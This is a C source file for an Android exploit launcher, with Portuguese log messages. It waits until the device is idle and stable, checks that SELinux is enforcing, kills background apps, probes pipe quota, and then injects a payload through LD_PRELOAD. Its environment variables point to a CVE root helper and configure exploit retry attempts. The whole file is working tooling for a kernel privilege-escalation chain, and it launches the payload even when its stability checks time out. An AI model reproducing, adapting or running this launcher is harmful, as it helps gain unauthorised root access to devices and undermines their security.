#define _GNU_SOURCE

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* Relaxed profile (default). */
#define REL_MIN_MEM_KB (768L * 1024L)
#define REL_MAX_TEMP_MC 52000L
#define REL_MAX_RUNNABLE 12
#define REL_MAX_CPU_PSI 40.0
#define REL_MAX_MEM_PSI 6.0
#define REL_MAX_IO_PSI 10.0
#define REL_MIN_UPTIME_SEC 60.0
#define REL_STABLE_SAMPLES 5
#define REL_MAX_MM_OBJECTS 2560L
#define REL_MAX_MM_DELTA 96L
#ifndef REL_MAX_MM_SLABS
#define REL_MAX_MM_SLABS 80L
#endif

#ifndef REL_GATE_NAME
#define REL_GATE_NAME "relaxado"
#endif

/* Conservative profile (--conservative). */
#define CONS_MIN_MEM_KB (2L * 1024L * 1024L)
#define CONS_MAX_TEMP_MC 42000L
#define CONS_MAX_RUNNABLE 4
#define CONS_MAX_CPU_PSI 12.0
#define CONS_MAX_MEM_PSI 1.0
#define CONS_MAX_IO_PSI 2.0
#define CONS_MIN_UPTIME_SEC 60.0
#define CONS_STABLE_SAMPLES 5
#define CONS_MAX_MM_OBJECTS 1024L
#define CONS_MAX_MM_SLABS 32L
#define CONS_MAX_MM_DELTA 32L

#define SAMPLE_INTERVAL_SEC 2
/* Adaptive fast path: when a sample clears the thresholds with wide margin
 * (device idle and cool), confirm with shorter-spaced samples instead of the
 * full baseline cadence. Borderline-but-passing samples still require the
 * full stable_samples at SAMPLE_INTERVAL_SEC; hot/loaded samples still reset
 * and wait. Both profiles require five samples on either path. */
#define FAST_STABLE_SAMPLES 5
#define FAST_INTERVAL_SEC 1
#define PAYLOAD_DELAY_SEC 2
#define APP_QUIET_ACK_TIMEOUT_MS 8000
#define APP_QUIET_ACK 'Q'
#define APP_QUIET_ENV "RMG_APP_QUIET_HANDSHAKE"
#define APP_KILL_ALL_TIMEOUT_MS 5000
#define TEMP_HEADROOM_MC 5000L
#define MAX_WAIT_SEC 60
#define PIPE_COUNT 480
#define PIPE_INITIAL_SIZE (2 * 4096)
#define PIPE_TARGET_SIZE (32 * 4096)

extern char **environ;

struct metrics {
  long mem_kb;
  long temp_mc;
  int runnable;
  double load1;
  double cpu_psi;
  double mem_psi;
  double io_psi;
  double uptime;
  int boot_complete;
  long selinux_enforcing;
  long mm_active;
  long mm_total;
  long mm_slabs;
};

struct gate_cfg {
  long min_mem_kb;
  long max_temp_mc;
  int max_runnable;
  double max_cpu_psi;
  double max_mem_psi;
  double max_io_psi;
  double min_uptime_sec;
  int stable_samples;
  long max_mm_objects;
  long max_mm_slabs;
  long max_mm_delta;
  const char *name;
};

static struct gate_cfg gate = {
    .min_mem_kb = REL_MIN_MEM_KB,
    .max_temp_mc = REL_MAX_TEMP_MC,
    .max_runnable = REL_MAX_RUNNABLE,
    .max_cpu_psi = REL_MAX_CPU_PSI,
    .max_mem_psi = REL_MAX_MEM_PSI,
    .max_io_psi = REL_MAX_IO_PSI,
    .min_uptime_sec = REL_MIN_UPTIME_SEC,
    .stable_samples = REL_STABLE_SAMPLES,
    .max_mm_objects = REL_MAX_MM_OBJECTS,
    .max_mm_slabs = REL_MAX_MM_SLABS,
    .max_mm_delta = REL_MAX_MM_DELTA,
    .name = REL_GATE_NAME,
};

static const struct gate_cfg gate_conservative = {
    .min_mem_kb = CONS_MIN_MEM_KB,
    .max_temp_mc = CONS_MAX_TEMP_MC,
    .max_runnable = CONS_MAX_RUNNABLE,
    .max_cpu_psi = CONS_MAX_CPU_PSI,
    .max_mem_psi = CONS_MAX_MEM_PSI,
    .max_io_psi = CONS_MAX_IO_PSI,
    .min_uptime_sec = CONS_MIN_UPTIME_SEC,
    .stable_samples = CONS_STABLE_SAMPLES,
    .max_mm_objects = CONS_MAX_MM_OBJECTS,
    .max_mm_slabs = CONS_MAX_MM_SLABS,
    .max_mm_delta = CONS_MAX_MM_DELTA,
    .name = "conservador",
};

static volatile sig_atomic_t stopped;

static void handle_signal(int signo) {
  (void)signo;
  stopped = 1;
}

static int read_long_file(const char *path, long *value) {
  FILE *file = fopen(path, "re");
  if (!file) return 0;
  int ok = fscanf(file, "%ld", value) == 1;
  fclose(file);
  return ok;
}

static int read_mem_available(long *value) {
  FILE *file = fopen("/proc/meminfo", "re");
  if (!file) return 0;
  char key[64];
  long amount;
  char unit[16];
  int ok = 0;
  while (fscanf(file, "%63s %ld %15s", key, &amount, unit) == 3) {
    if (strcmp(key, "MemAvailable:") == 0) {
      *value = amount;
      ok = 1;
      break;
    }
  }
  fclose(file);
  return ok;
}

static int read_load(double *load1, int *runnable) {
  FILE *file = fopen("/proc/loadavg", "re");
  if (!file) return 0;
  double load5, load15;
  int total;
  int ok = fscanf(file, "%lf %lf %lf %d/%d", load1, &load5, &load15,
                  runnable, &total) == 5;
  fclose(file);
  return ok;
}

static int read_psi(const char *path, double *avg10) {
  FILE *file = fopen(path, "re");
  if (!file) return 0;
  char line[256];
  int ok = 0;
  if (fgets(line, sizeof(line), file) && strncmp(line, "some ", 5) == 0) {
    char *field = strstr(line, "avg10=");
    if (field) {
      char *end = NULL;
      errno = 0;
      double value = strtod(field + 6, &end);
      if (errno == 0 && end != field + 6) {
        *avg10 = value;
        ok = 1;
      }
    }
  }
  fclose(file);
  return ok;
}

static int read_max_temperature(long *maximum) {
  /* Zone names are static during a boot. Discover them once, but read every
   * temperature on each full sample so the maximum remains current. */
  static char (*paths)[256];
  static size_t count;
  static int discovered;
  if (!discovered) {
    DIR *dir = opendir("/sys/class/thermal");
    if (!dir) return 0;
    size_t capacity = 0;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
      if (strncmp(entry->d_name, "thermal_zone", 12) != 0) continue;
      if (count == capacity) {
        size_t next_capacity = capacity ? capacity * 2 : 32;
        void *next = realloc(paths, next_capacity * sizeof(*paths));
        if (!next) {
          closedir(dir);
          free(paths);
          paths = NULL;
          count = 0;
          return 0;
        }
        paths = next;
        capacity = next_capacity;
      }
      int length = snprintf(paths[count], sizeof(paths[count]),
                            "/sys/class/thermal/%s/temp", entry->d_name);
      if (length > 0 && (size_t)length < sizeof(paths[count])) count++;
    }
    closedir(dir);
    if (!count) return 0;
    discovered = 1;
  }
  long max_seen = 0;
  int found = 0;
  for (size_t i = 0; i < count; i++) {
    long value;
    if (read_long_file(paths[i], &value) && value > 0 && value < 200000) {
      if (!found || value > max_seen) max_seen = value;
      found = 1;
    }
  }
  if (found) *maximum = max_seen;
  return found;
}

static int read_uptime(double *uptime) {
  FILE *file = fopen("/proc/uptime", "re");
  if (!file) return 0;
  int ok = fscanf(file, "%lf", uptime) == 1;
  fclose(file);
  return ok;
}

static int wait_for_minimum_uptime(double minimum) {
  while (!stopped) {
    double uptime;
    if (!read_uptime(&uptime)) {
      fprintf(stderr, "[launcher] uptime-gate=fail leitura de /proc/uptime\n");
      return 0;
    }
    if (uptime >= minimum) {
      fprintf(stderr,
              "[launcher] uptime-gate=pass uptime=%.0fs minimum=%.0fs\n",
              uptime, minimum);
      return 1;
    }

    double remaining = minimum - uptime;
    time_t seconds = (time_t)remaining;
    if ((double)seconds < remaining) seconds++;
    fprintf(stderr, "[launcher] aguardando uptime minimo: %.0fs restantes\n",
            remaining);
    struct timespec delay = {.tv_sec = seconds, .tv_nsec = 0};
    while (!stopped) {
      struct timespec interrupted;
      int error =
          clock_nanosleep(CLOCK_MONOTONIC, 0, &delay, &interrupted);
      if (error == 0) break;
      if (error != EINTR) {
        fprintf(stderr,
                "[launcher] espera do uptime falhou errno=%d(%s)\n", error,
                strerror(error));
        return 0;
      }
      delay = interrupted;
    }
  }
  return 0;
}

static int wait_before_payload(void) {
  struct timespec delay = {.tv_sec = PAYLOAD_DELAY_SEC, .tv_nsec = 0};
  while (!stopped) {
    struct timespec interrupted;
    int error = clock_nanosleep(CLOCK_MONOTONIC, 0, &delay, &interrupted);
    if (error == 0) return 1;
    if (error != EINTR) {
      fprintf(stderr,
              "[launcher] espera antes do payload falhou errno=%d(%s)\n",
              error, strerror(error));
      return 0;
    }
    delay = interrupted;
  }
  return 0;
}

static int app_quiet_handshake_enabled(void) {
  const char *value = getenv(APP_QUIET_ENV);
  return value && strcmp(value, "1") == 0;
}

static int wait_for_app_quiet_ack(void) {
  fprintf(stderr, "[launcher] app-quiesce-ready post_quiet=5s\n");
  struct pollfd descriptor = {
      .fd = STDIN_FILENO,
      .events = POLLIN,
      .revents = 0,
  };
  int ready;
  do {
    ready = poll(&descriptor, 1, APP_QUIET_ACK_TIMEOUT_MS);
  } while (ready < 0 && errno == EINTR && !stopped);
  if (stopped) return 0;
  if (ready == 0) {
    fprintf(stderr, "[launcher] app-quiesce=fail timeout aguardando ACK\n");
    return 0;
  }
  if (ready < 0) {
    fprintf(stderr, "[launcher] app-quiesce=fail poll errno=%d(%s)\n", errno,
            strerror(errno));
    return 0;
  }
  if (!(descriptor.revents & POLLIN)) {
    fprintf(stderr, "[launcher] app-quiesce=fail stdin revents=0x%x\n",
            descriptor.revents);
    return 0;
  }
  unsigned char ack = 0;
  ssize_t count;
  do {
    count = read(STDIN_FILENO, &ack, 1);
  } while (count < 0 && errno == EINTR && !stopped);
  if (count != 1 || ack != APP_QUIET_ACK) {
    fprintf(stderr, "[launcher] app-quiesce=fail ACK inválido\n");
    return 0;
  }
  return 1;
}

static int read_boot_complete(void) {
  char value[PROP_VALUE_MAX] = {0};
  return __system_property_get("sys.boot_completed", value) > 0 &&
         strcmp(value, "1") == 0;
}

static int read_mm_struct_slab(long *active, long *total, long *slabs) {
  FILE *file = fopen("/proc/slabinfo", "re");
  if (!file) return 0;
  char line[512];
  int ok = 0;
  while (fgets(line, sizeof(line), file)) {
    if (strncmp(line, "mm_struct", 9) != 0 ||
        !isspace((unsigned char)line[9])) continue;
    char name[64];
    long active_objs, total_objs, object_size, objects_per_slab;
    long pages_per_slab;
    if (sscanf(line, "%63s %ld %ld %ld %ld %ld", name, &active_objs,
               &total_objs, &object_size, &objects_per_slab,
               &pages_per_slab) != 6 || strcmp(name, "mm_struct") != 0) {
      continue;
    }
    if (objects_per_slab <= 0) break;
    *active = active_objs;
    *total = total_objs;
    *slabs = (total_objs + objects_per_slab - 1) / objects_per_slab;
    ok = 1;
    break;
  }
  fclose(file);
  return ok;
}

static int collect_cheap_metrics(struct metrics *m) {
  memset(m, 0, sizeof(*m));
  m->boot_complete = read_boot_complete();
  return read_uptime(&m->uptime) &&
         read_long_file("/sys/fs/selinux/enforce", &m->selinux_enforcing) &&
         read_mem_available(&m->mem_kb) &&
         read_load(&m->load1, &m->runnable) &&
         read_psi("/proc/pressure/cpu", &m->cpu_psi) &&
         read_psi("/proc/pressure/memory", &m->mem_psi) &&
         read_psi("/proc/pressure/io", &m->io_psi);
}

static int metrics_cheap_stable(const struct metrics *m) {
  return m->boot_complete && m->selinux_enforcing == 1 &&
         m->uptime >= gate.min_uptime_sec &&
         m->mem_kb >= gate.min_mem_kb && m->runnable <= gate.max_runnable &&
         m->cpu_psi <= gate.max_cpu_psi &&
         m->mem_psi <= gate.max_mem_psi && m->io_psi <= gate.max_io_psi;
}

static int collect_expensive_metrics(struct metrics *m) {
  return read_max_temperature(&m->temp_mc) &&
         read_mm_struct_slab(&m->mm_active, &m->mm_total, &m->mm_slabs);
}

static int metrics_stable(const struct metrics *m) {
  return m->boot_complete && m->selinux_enforcing == 1 &&
         m->uptime >= gate.min_uptime_sec &&
         m->mem_kb >= gate.min_mem_kb && m->temp_mc <= gate.max_temp_mc &&
         m->runnable <= gate.max_runnable && m->cpu_psi <= gate.max_cpu_psi &&
         m->mem_psi <= gate.max_mem_psi && m->io_psi <= gate.max_io_psi &&
         m->mm_active <= gate.max_mm_objects && m->mm_total <= gate.max_mm_objects &&
         m->mm_slabs <= gate.max_mm_slabs;
}

/* Comfortable = passes every threshold with margin: half the PSI ceilings,
 * half the runnable ceiling, 1.5x the memory floor, temperature TEMP_HEADROOM_MC
 * below its ceiling. Implies metrics_stable(). Used to shorten the gate on a
 * clearly idle device without lowering the acceptance thresholds. */
static int metrics_comfortable(const struct metrics *m) {
  return m->boot_complete && m->selinux_enforcing == 1 &&
         m->uptime >= gate.min_uptime_sec &&
         m->mem_kb >= gate.min_mem_kb + gate.min_mem_kb / 2 &&
         m->temp_mc <= gate.max_temp_mc - TEMP_HEADROOM_MC &&
         m->runnable <= gate.max_runnable / 2 &&
         m->cpu_psi <= gate.max_cpu_psi / 2.0 &&
         m->mem_psi <= gate.max_mem_psi / 2.0 &&
         m->io_psi <= gate.max_io_psi / 2.0 &&
         m->mm_active <= gate.max_mm_objects && m->mm_total <= gate.max_mm_objects &&
         m->mm_slabs <= gate.max_mm_slabs;
}

static int timespec_at_or_after(const struct timespec *a,
                                const struct timespec *b) {
  return a->tv_sec > b->tv_sec ||
         (a->tv_sec == b->tv_sec && a->tv_nsec >= b->tv_nsec);
}

static int wait_interval_absolute(struct timespec *deadline, int seconds,
                                  const struct timespec *timeout_at) {
  deadline->tv_sec += seconds;
  if (timespec_at_or_after(deadline, timeout_at)) *deadline = *timeout_at;
  while (!stopped) {
    int error = clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, deadline, NULL);
    if (error == 0) return 1;
    if (error != EINTR) {
      fprintf(stderr, "[launcher] clock_nanosleep falhou errno=%d(%s)\n",
              error, strerror(error));
      return 0;
    }
  }
  return 1;
}

static int pipe_capacity_probe(void) {
  int pipes[PIPE_COUNT][2];
  for (int i = 0; i < PIPE_COUNT; i++) {
    pipes[i][0] = -1;
    pipes[i][1] = -1;
  }
  struct rlimit limit;
  if (getrlimit(RLIMIT_NOFILE, &limit) == 0) {
    limit.rlim_cur = limit.rlim_max;
    (void)setrlimit(RLIMIT_NOFILE, &limit);
  }
  int ok = 1;
  int failed_at = -1;
  int saved_errno = 0;
  for (int i = 0; i < PIPE_COUNT; i++) {
    if (pipe2(pipes[i], O_CLOEXEC) != 0 ||
        fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_INITIAL_SIZE) == -1) {
      ok = 0;
      failed_at = i;
      saved_errno = errno;
      break;
    }
  }
  if (ok) {
    for (int i = 0; i < PIPE_COUNT; i++) {
      if (fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_TARGET_SIZE) == -1) {
        ok = 0;
        failed_at = i;
        saved_errno = errno;
        break;
      }
    }
  }
  for (int i = 0; i < PIPE_COUNT; i++) {
    if (pipes[i][0] >= 0) close(pipes[i][0]);
    if (pipes[i][1] >= 0) close(pipes[i][1]);
  }
  if (ok) {
    fprintf(stderr,
            "[launcher] pipe-gate=pass pipes=%d target_pages=%d\n",
            PIPE_COUNT, PIPE_TARGET_SIZE / 4096);
  } else {
    fprintf(stderr,
            "[launcher] pipe-gate=fail index=%d errno=%d(%s); aguardando timeout\n",
            failed_at, saved_errno, strerror(saved_errno));
  }
  return ok;
}

static int validate_elf(const char *path) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  unsigned char magic[4];
  ssize_t count = read(fd, magic, sizeof(magic));
  close(fd);
  return count == 4 && magic[0] == 0x7f && magic[1] == 'E' &&
         magic[2] == 'L' && magic[3] == 'F';
}

static int stop_background_apps(void) {
  pid_t child = fork();
  if (child < 0) {
    fprintf(stderr, "[launcher] app-kill-all=fail fork errno=%d(%s)\n",
            errno, strerror(errno));
    return 0;
  }
  if (child == 0) {
    char *const command[] = {"/system/bin/am", "kill-all", NULL};
    execv(command[0], command);
    _exit(127);
  }

  int status = 0;
  for (int elapsed = 0; elapsed < APP_KILL_ALL_TIMEOUT_MS; elapsed += 20) {
    pid_t waited = waitpid(child, &status, WNOHANG);
    if (waited == child) {
      int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
      fprintf(stderr, "[launcher] app-kill-all=%s status=%d\n",
              ok ? "pass" : "fail", status);
      return ok;
    }
    if (waited < 0 && errno != EINTR) {
      fprintf(stderr,
              "[launcher] app-kill-all=fail waitpid errno=%d(%s)\n",
              errno, strerror(errno));
      return 0;
    }
    usleep(20000);
  }

  kill(child, SIGKILL);
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  fprintf(stderr, "[launcher] app-kill-all=fail timeout=%dms\n",
          APP_KILL_ALL_TIMEOUT_MS);
  return 0;
}

static void usage(const char *program) {
  fprintf(stderr,
          "Uso: %s --payload CAMINHO --helper CAMINHO [--check-only] "
          "[--mm-factory CAMINHO] [--conservative]\n",
          program);
}

int main(int argc, char **argv) {
  const char *inherited_preload = getenv("LD_PRELOAD");
  if (inherited_preload && inherited_preload[0] != '\0') {
    fprintf(stderr,
            "[launcher] recusado: LD_PRELOAD já estava definido antes do gate\n");
    return 2;
  }
  const char *payload = NULL;
  const char *helper = NULL;
  const char *mm_factory = NULL;
  int check_only = 0;
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--payload") == 0 && i + 1 < argc) {
      payload = argv[++i];
    } else if (strcmp(argv[i], "--helper") == 0 && i + 1 < argc) {
      helper = argv[++i];
    } else if (strcmp(argv[i], "--mm-factory") == 0 && i + 1 < argc) {
      mm_factory = argv[++i];
    } else if (strcmp(argv[i], "--check-only") == 0) {
      check_only = 1;
    } else if (strcmp(argv[i], "--conservative") == 0) {
      gate = gate_conservative;
    } else {
      usage(argv[0]);
      return 2;
    }
  }
  if (!check_only && (!payload || !helper)) {
    usage(argv[0]);
    return 2;
  }
  if (!check_only &&
      (!validate_elf(payload) || !validate_elf(helper) ||
       (mm_factory && !validate_elf(mm_factory)))) {
    fprintf(stderr,
            "[launcher] payload/helper/factory ausente ou ELF inválido\n");
    return 2;
  }

  struct sigaction action;
  memset(&action, 0, sizeof(action));
  action.sa_handler = handle_signal;
  sigemptyset(&action.sa_mask);
  sigaction(SIGINT, &action, NULL);
  sigaction(SIGTERM, &action, NULL);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  if (!check_only) stop_background_apps();

  fprintf(stderr,
          "[launcher] gate %s: %d amostras/%ds (fast %d/%ds) temp<=%ldC "
          "mem>=%ldMB tarefas<=%d PSI<=%.0f/%.0f/%.0f uptime>=%.0fs mm<=%ld/%ld "
          "mm-delta<=%ld pipe=480x32 timeout=%ds\n",
          gate.name, gate.stable_samples, SAMPLE_INTERVAL_SEC,
          FAST_STABLE_SAMPLES, FAST_INTERVAL_SEC,
          gate.max_temp_mc / 1000, gate.min_mem_kb / 1024,
          gate.max_runnable, gate.max_cpu_psi, gate.max_mem_psi,
          gate.max_io_psi, gate.min_uptime_sec, gate.max_mm_objects,
          gate.max_mm_slabs, gate.max_mm_delta, MAX_WAIT_SEC);
  if (!wait_for_minimum_uptime(gate.min_uptime_sec)) {
    return stopped ? 130 : 1;
  }
  struct timespec started;
  if (clock_gettime(CLOCK_MONOTONIC, &started) != 0) {
    perror("[launcher] clock_gettime");
    return 1;
  }
  struct timespec timeout_at = started;
  timeout_at.tv_sec += MAX_WAIT_SEC;
  int stable = 0;
  int comfortable_streak = 0;
  int gate_passed = 0;
  int pipe_probed = 0;
  int pipe_ok = 0;
  int have_previous_full = 0;
  struct metrics previous_full;
  memset(&previous_full, 0, sizeof(previous_full));
  struct timespec next_sample = started;
  int wait_failed = 0;
  while (!stopped) {
    struct timespec now;
    if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) {
      perror("[launcher] clock_gettime");
      return 1;
    }
    if (timespec_at_or_after(&now, &timeout_at)) break;
    struct metrics m;
    int cheap_valid = collect_cheap_metrics(&m);
    int cheap_stable = cheap_valid && metrics_cheap_stable(&m);
    int full_valid = cheap_stable && collect_expensive_metrics(&m);
    long mm_delta = 0;
    if (full_valid && have_previous_full) {
      long active_delta = labs(m.mm_active - previous_full.mm_active);
      long total_delta = labs(m.mm_total - previous_full.mm_total);
      long slab_delta = labs(m.mm_slabs - previous_full.mm_slabs) * 32L;
      mm_delta = active_delta;
      if (total_delta > mm_delta) mm_delta = total_delta;
      if (slab_delta > mm_delta) mm_delta = slab_delta;
    }
    int churn_stable = !have_previous_full || mm_delta <= gate.max_mm_delta;
    int accepted = full_valid && metrics_stable(&m) && churn_stable;
    int comfortable = accepted && metrics_comfortable(&m);
    if (!pipe_probed || !pipe_ok) {
      stable = 0;
      comfortable_streak = 0;
    } else {
      stable = accepted ? stable + 1 : 0;
      comfortable_streak = comfortable ? comfortable_streak + 1 : 0;
    }
    if (full_valid) {
      fprintf(stderr,
              "[launcher] gate=%d/%d phase=%s temp=%.1fC mem=%ldMB runnable=%d "
              "load=%.2f psi=%.2f/%.2f/%.2f mm=%ld/%ld slabs=%ld dmm=%ld "
              "uptime=%.0fs boot=%d se=%ld\n",
              stable, gate.stable_samples, comfortable ? "fast" : "baseline",
              m.temp_mc / 1000.0,
              m.mem_kb / 1024,
              m.runnable, m.load1, m.cpu_psi, m.mem_psi, m.io_psi,
              m.mm_active, m.mm_total, m.mm_slabs, mm_delta, m.uptime,
              m.boot_complete, m.selinux_enforcing);
    } else if (cheap_valid) {
      fprintf(stderr,
              "[launcher] gate=0/%d phase=cheap temp=deferred mem=%ldMB "
              "runnable=%d load=%.2f psi=%.2f/%.2f/%.2f mm=deferred "
              "uptime=%.0fs boot=%d\n",
              gate.stable_samples, m.mem_kb / 1024, m.runnable, m.load1,
              m.cpu_psi, m.mem_psi, m.io_psi, m.uptime, m.boot_complete);
    } else {
      fprintf(stderr, "[launcher] gate=0/%d leitura de métricas inválida\n",
              gate.stable_samples);
    }

    /* The first complete stable sample is a precheck. Probe pipe quota once,
     * then discard that sample: every sample counted toward launch is taken
     * after the transient 480-pipe allocation has been released. */
    if (accepted && !pipe_probed) {
      pipe_probed = 1;
      pipe_ok = pipe_capacity_probe();
      if (pipe_ok) {
        fprintf(stderr,
                "[launcher] pipe-gate aprovado; iniciando confirmação final\n");
        previous_full = m;
        have_previous_full = 1;
        if (clock_gettime(CLOCK_MONOTONIC, &next_sample) != 0) {
          perror("[launcher] clock_gettime");
          return 1;
        }
        if (!wait_interval_absolute(
                &next_sample,
                comfortable ? FAST_INTERVAL_SEC : SAMPLE_INTERVAL_SEC,
                &timeout_at)) {
          wait_failed = 1;
          break;
        }
        continue;
      }
      if (clock_gettime(CLOCK_MONOTONIC, &next_sample) != 0) {
        perror("[launcher] clock_gettime");
        return 1;
      }
    }

    if (full_valid) {
      previous_full = m;
      have_previous_full = 1;
    }

    /* Accept once after the pipe probe: full baseline count, or the shorter
     * fast count when every recent sample was comfortable. */
    if (stable >= gate.stable_samples ||
        comfortable_streak >= FAST_STABLE_SAMPLES) {
      gate_passed = 1;
      break;
    }
    if (!wait_interval_absolute(
            &next_sample,
            comfortable ? FAST_INTERVAL_SEC : SAMPLE_INTERVAL_SEC,
            &timeout_at)) {
      wait_failed = 1;
      break;
    }
  }
  if (stopped) {
    fprintf(stderr, "[launcher] cancelado antes de carregar payload\n");
    return 130;
  }
  if (wait_failed) {
    return 1;
  }
  if (!gate_passed) {
    fprintf(stderr,
            "[launcher] ALERTA: timeout de %ds; ambiente não estabilizou "
            "(pipe=%s); liberando payload mesmo assim\n",
            MAX_WAIT_SEC, pipe_probed ? (pipe_ok ? "aprovado" : "falhou")
                                      : "não verificado");
  } else {
    fprintf(stderr,
            "[launcher] estabilidade confirmada: métricas+slab+pipe\n");
  }
  double launch_uptime = -1.0;
  if (!read_uptime(&launch_uptime) || launch_uptime < gate.min_uptime_sec) {
    fprintf(stderr,
            "[launcher] uptime-gate=fail antes do payload uptime=%.0fs "
            "minimum=%.0fs\n",
            launch_uptime, gate.min_uptime_sec);
    return 1;
  }
  if (check_only) return 0;

  /* The payload supervisor retries only while its shared kernel-state marker
   * remains ATTEMPT_PRE_MUTATION. Any futex/global-FOPS/workqueue mutation
   * stops the loop. Keep this bounded: two retries cover transient allocator
   * misses without restoring the old unbounded/high-attempt behavior. */
  if (setenv("CVE43499_ROOT_HELPER", helper, 1) != 0 ||
      (mm_factory && setenv("CVE43499_MM_FACTORY", mm_factory, 1) != 0) ||
      setenv("EXPLOIT_ATTEMPTS", "3", 1) != 0 ||
      setenv("P0_ATTEMPT_TIMEOUT_SEC", "45", 0) != 0 ||
      setenv("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "180", 0) != 0 ||
      setenv("BOOT_QUIET_SEC", "0", 0) != 0 ||
      setenv("FUTEX_WAIT_SEC", "1", 0) != 0 ||
      setenv("KSNITCH_REPEAT", "64", 0) != 0 ||
      setenv("LD_PRELOAD", payload, 1) != 0) {
    perror("[launcher] setenv");
    return 1;
  }
  fprintf(stderr,
          "[launcher] payload-delay=%ds; checagens concluídas\n",
          PAYLOAD_DELAY_SEC);
  if (!wait_before_payload()) return stopped ? 130 : 1;

  const int app_quiet = app_quiet_handshake_enabled();
  if (app_quiet && !wait_for_app_quiet_ack()) return stopped ? 130 : 1;
  if (!app_quiet)
    fprintf(stderr, "[launcher] execve: carregando payload agora\n");
  char *const child_argv[] = {"/system/bin/true", NULL};
  execve(child_argv[0], child_argv, environ);
  perror("[launcher] execve");
  return 1;
}
